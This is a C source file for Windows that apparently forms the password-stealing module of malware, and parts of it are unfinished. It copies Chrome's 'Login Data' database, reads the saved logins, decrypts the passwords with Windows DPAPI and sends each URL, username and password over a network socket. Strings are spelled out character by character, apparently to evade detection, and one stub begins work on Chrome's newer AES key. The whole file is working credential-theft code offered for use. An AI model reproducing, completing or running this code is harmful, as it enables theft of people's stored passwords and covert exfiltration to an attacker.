#ifdef UNICODE
#undef UNICODE
#endif

#include <windows.h>
#include <Shlwapi.h>
#include <Shlobj.h>
#include <conio.h>
#include <Wincrypt.h>
#include <stdlib.h>
#include <stdio.h>
#include <memory.h>


#include "sqlite3.h"
#include "mem.h"
#include "misc.h"
#include "parson.h"
#include "chrome.h"
#include "base64.h"
#include "aes.h"

#pragma comment (lib, "shlwapi.lib")
#pragma comment (lib, "crypt32.lib")
#pragma comment (lib, "Shell32.lib")

SOCKET s;

LPSTR GetChromeProfilePath()
{
	char strFormat[] = { '%', 's', '\\', 'G', 'o', 'o', 'g', 'l', 'e', '\\', 'C', 'h', 'r', 'o', 'm', 'e', '\\', 'U', 's', 'e', 'r', ' ', 'D', 'a', 't', 'a', '\\', 'D', 'e', 'f', 'a', 'u', 'l', 't', '\0' }; //here is the issue
	LPSTR strPath = (LPSTR)talloc((MAX_PATH + 1)*sizeof(char));
	if (!SHGetSpecialFolderPath(NULL, strPath, CSIDL_LOCAL_APPDATA, FALSE))
		return NULL;

	LPSTR strFullPath = (LPSTR)talloc((MAX_PATH + 1)*sizeof(char));
	_snprintf_s(strFullPath, MAX_PATH, _TRUNCATE, strFormat, strPath);  //FIXME: array

	LPSTR strShortPath = (LPSTR)talloc((MAX_PATH + 1)*sizeof(char));
	if (!GetShortPathName(strFullPath, strShortPath, MAX_PATH) || !PathFileExists(strShortPath))
	{
		tfree(strShortPath);
		strShortPath = NULL;
	}

	tfree(strPath);
	tfree(strFullPath);

	if (PathFileExistsA(strShortPath))
		return strShortPath;

	return NULL;
}
LPSTR GetChromeUserDataPath()
{
	char strFormat[] = { '%', 's', '\\', 'G', 'o', 'o', 'g', 'l', 'e', '\\', 'C', 'h', 'r', 'o', 'm', 'e', '\\', 'U', 's', 'e', 'r', ' ', 'D', 'a', 't', 'a', '\0'}; //here is the issue
	LPSTR strPath = (LPSTR)talloc((MAX_PATH + 1)*sizeof(char));
	if (!SHGetSpecialFolderPath(NULL, strPath, CSIDL_LOCAL_APPDATA, FALSE))
		return NULL;

	LPSTR strFullPath = (LPSTR)talloc((MAX_PATH + 1)*sizeof(char));
	_snprintf_s(strFullPath, MAX_PATH, _TRUNCATE, strFormat, strPath);  //FIXME: array

	LPSTR strShortPath = (LPSTR)talloc((MAX_PATH + 1)*sizeof(char));
	if (!GetShortPathName(strFullPath, strShortPath, MAX_PATH) || !PathFileExists(strShortPath))
	{
		tfree(strShortPath);
		strShortPath = NULL;
	}

	tfree(strPath);
	tfree(strFullPath);

	if (PathFileExistsA(strShortPath))
		return strShortPath;

	return NULL;
}


LPSTR CrackChrome(PBYTE pass, DWORD size) {

	DATA_BLOB data_in, data_out;
	DWORD dwBlobSize;

	CHAR *decrypted;

	data_out.pbData = 0;
	data_out.cbData = 0;
	data_in.pbData = pass;
	DWORD cbDataInput = size;
	data_in.cbData = cbDataInput;

		
	CryptUnprotectData(&data_in, NULL, NULL, NULL, NULL, 8, &data_out);
	
	

	LPSTR strClearData = (LPSTR)talloc((data_out.cbData + 1)*sizeof(char));
	if (!strClearData)
	{
		LocalFree(data_out.pbData);
		return pass;
	}

	//FIXFIXFIXFIX

	decrypted = (LPSTR)talloc((data_out.cbData + 1)*sizeof(char));
	memset(decrypted, 0, data_out.cbData);
	memcpy(decrypted, data_out.pbData, data_out.cbData);

	sprintf_s(strClearData, data_out.cbData + 1, "%s", decrypted);

	LocalFree(data_out.pbData);
	tfree(decrypted);
	return strClearData;
}



LPSTR CrackChromeNew(PBYTE pass){
	LPSTR strProfilePath = GetChromeUserDataPath();
	
	HANDLE hFile, hMap;
	DWORD loginSize = 0;
	CHAR *loginMap, *localLoginMap;
	JSON_Value *root_value;
	JSON_Array *logins;
	JSON_Object *root_object;
	JSON_Object *commit;
	//encrypted_key
	CHAR strKey[] = { 'e', 'n', 'c', 'r', 'y', 'p', 't','e','d','_','k','e','y','\0' };
	CHAR strFileName[] = { 'L', 'o', 'c', 'a', 'l', ' ', 'S', 't', 'a', 't', 'e', 0x0 };

	LPSTR strKeyDecrypted;
	CHAR tmp_buff[255];
	CHAR* tmp_file;
	tmp_file = dupcat(strProfilePath, "\\",strFileName, NULL);

	if ((hFile = CreateFileA(tmp_file, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL)) == INVALID_HANDLE_VALUE)
	{
		free(tmp_file);
		tfree(strProfilePath);
		printf("FUCK");
		return;
	}

	loginSize = GetFileSize(hFile, NULL);
	if (loginSize == INVALID_FILE_SIZE)
	{
		CloseHandle(hFile);
		free(tmp_file);
		tfree(strProfilePath);
			printf("FUCK");
		return;
	}

	localLoginMap = (CHAR*)calloc(loginSize + 1, sizeof(CHAR));
	if (localLoginMap == NULL)
	{
		CloseHandle(hFile);
		free(tmp_file);
		tfree(strProfilePath);
			printf("FUCK");
		return;
	}

	if ((hMap = CreateFileMappingA(hFile, NULL, PAGE_READONLY, 0, 0, NULL)) == NULL)
	{
		tfree(localLoginMap);
		CloseHandle(hFile);
		free(tmp_file);
		tfree(strProfilePath);
			printf("FUCK");
		return;
	}

	if ((loginMap = (CHAR*)MapViewOfFile(hMap, FILE_MAP_READ, 0, 0, 0)) == NULL)
	{
		CloseHandle(hMap);
		tfree(localLoginMap);
		CloseHandle(hFile);
		free(tmp_file);
		tfree(strProfilePath);
			printf("FUCK");
	}

	memcpy_s(localLoginMap, loginSize + 1, loginMap, loginSize);

	// parse time
	root_value = json_parse_string(localLoginMap);
	
	root_object = json_value_get_object(root_value);
	

	char os_crypt[] = {'e','n','c','r','y','p','t','e','d','_','k','e','y','\n'}; 
 	JSON_Object *keyObject = json_object_get_object(root_object,"os_crypt");
	LPSTR BaseEncryptedKey = json_object_get_string(keyObject,json_object_get_name(keyObject,0));
	DWORD len;
	LPSTR DpapEncryptedKey = base64_decode(BaseEncryptedKey,strlen(BaseEncryptedKey),&len);
	LPSTR encryptedKey = &DpapEncryptedKey[5];
	LPSTR decryptedKey = CrackChrome((PBYTE) encryptedKey,len-5);
	LPSTR iv = &pass[3];
	DWORD ivLen = 12;
	LPSTR payload = &pass[15];
	//here i am 

	return decryptedKey;

}
int chrome_worker(PVOID lpReserved, int dwColumns, LPSTR *strValues, LPSTR *strNames)
{
	LPSTR strResource = NULL;
	LPSTR strUser = NULL; 
	LPSTR strPass = NULL;

	CHAR strOrigin[] = { 'o', 'r', 'i', 'g', 'i', 'n', '_', 'u', 'r', 'l', 0x0 };
	CHAR strUserVal[] = { 'u', 's', 'e', 'r', 'n', 'a', 'm', 'e', '_', 'v', 'a', 'l', 'u', 'e', 0x0 };
	CHAR strPassVal[] = { 'p', 'a', 's', 's', 'w', 'o', 'r', 'd', '_', 'v', 'a', 'l', 'u', 'e', 0x0 };

	CHAR strChrome[] = { 'C', 'h', 'r', 'o', 'm', 'e', 0x0 };
	for (DWORD i = 0; i < dwColumns; i++)
	{

		if (!strNames[i])
			continue;

		if (!strcmp(strNames[i], strOrigin))
		{
			strResource = (LPSTR)talloc(1024 * sizeof(char));
			//sprintf_s(strResource, 1024, "%S", strValues[i]);
			sprintf_s(strResource, 1024, "%s", strValues[i]);

		}
		else if (!strcmp(strNames[i], strUserVal))
		{
			strUser = (LPSTR)talloc(1024 * sizeof(char));
			sprintf_s(strUser, 1024, "%s", strValues[i]);
		}
		else if (!strcmp(strNames[i], strPassVal)){
			strPass = CrackChrome((PBYTE)strValues[i],strlen(strValues[i])+1);
			if(strlen(strPass) <= 0){
				//CrackChromeNew(strPass);
				}
			
		}
	}
	int i = 1;
	if (i == 1)
	{
		Sleep(1);
		char strHostnameSize = strlen(strResource);
		char strUserSize = strlen(strUser);
		char strPasswd = strlen(strPass);
		char headerSize = strHostnameSize + strUserSize + strPasswd + sizeof(strHostnameSize) + sizeof(strUserSize) +sizeof(strPasswd);

		

		if(send(s,&headerSize,sizeof(char),0) < 0 ){
			
		}
		

		if(send(s,&strHostnameSize,sizeof(char),0) < 0 ){
			
		}
		if(send(s,&strUserSize,sizeof(char),0) < 0 ){
			
		}
		if(send(s,&strPasswd,sizeof(char),0) < 0 ){
			
		}
		if(send(s,strResource,strHostnameSize,0) < 0 ){
			
		}
		if(send(s,strUser,strUserSize,0) < 0){
			
		}
		send(s,strPass,strPasswd,0); //chech if this is working
		//HERE
	}

	tfree(strResource);
	tfree(strUser);
	tfree(strPass);
	return 0;
}

VOID dump_chromesql_pass()
{
	LPSTR strProfilePath = GetChromeProfilePath();
	if (!strProfilePath)
		return;

	DWORD dwSize = strlen(strProfilePath) + 1024;
	LPSTR strFilePath = (LPSTR)talloc(dwSize);
	
	SetCurrentDirectory(strProfilePath);
	CopyFile("Login Data", "templogin", 0);
	
	CHAR strFileName[] = { 't', 'e', 'm', 'p', 'l', 'o', 'g', 'i', 'n', 0x0 };
	_snprintf_s(strFilePath, dwSize, _TRUNCATE, "%s\\%s", strProfilePath, strFileName);
	
	sqlite3 *lpDb = NULL;
	if (sqlite3_open((const char *)strFilePath, &lpDb) == SQLITE_OK)
	{
		sqlite3_busy_timeout(lpDb, 5000); 
		CHAR strQuery[] = { 'S', 'E', 'L', 'E', 'C', 'T', ' ', '*', ' ', 'F', 'R', 'O', 'M', ' ', 'l', 'o', 'g', 'i', 'n', 's', ';', 0x0 };
		sqlite3_exec(lpDb, strQuery, chrome_worker, 0, NULL); 

		sqlite3_close(lpDb);
	}

	DeleteFile("templogin");
	tfree(strFilePath);
	tfree(strProfilePath);
}


VOID dump_chrome_passwords(SOCKET socket)
{
	s = socket;
	
	dump_chromesql_pass();
	
}


const char *uncryptData(PBYTE password, int size)
{ 
	DATA_BLOB in; 
	DATA_BLOB out;
	
	in.pbData = password;
	in.cbData = (size + 1);
	if (CryptUnprotectData(&in, NULL, NULL, NULL, NULL, 0, &out))  
	{ 
		out.pbData[out.cbData] = 0; // set zero terminator '\0' 
		return ((const char*)out.pbData);
    } 
	return ("Error not found\n");
}

void printPassword(sqlite3_stmt *stmt)
{
	LPSTR url = (const char *)sqlite3_column_text(stmt, 0);
	LPSTR login = (const char *)sqlite3_column_text(stmt, 1);
	LPSTR password = uncryptData((BYTE *)sqlite3_column_text(stmt, 3), sqlite3_column_int(stmt, 2));
	
	if (login != "" && password != "")
	{
		printf("CHROME => uname: %s\tpwd: %s\tsite: %s\n", login, password, url);
	}
}
void findPasswordTable(sqlite3 *db)
{
	int i = 0;
	sqlite3_stmt  *stmt;

	CHAR strQuery[] = { 'S', 'E', 'L', 'E', 'C', 'T', ' ', '*', ' ', 'F', 'R', 'O', 'M', ' ', 'l', 'o', 'g', 'i', 'n', 's', ';', 0x0 };
	if (sqlite3_prepare_v2(db, strQuery, -1, &stmt, 0) == SQLITE_OK) 
	{
	
		while (sqlite3_step(stmt) == SQLITE_ROW)
		{
			printPassword(stmt); /* decrypt and display infos */
			i++;
		}
		
	}
	sqlite3_finalize(stmt); // finalize the compiled query
	sqlite3_close(db); // close database
}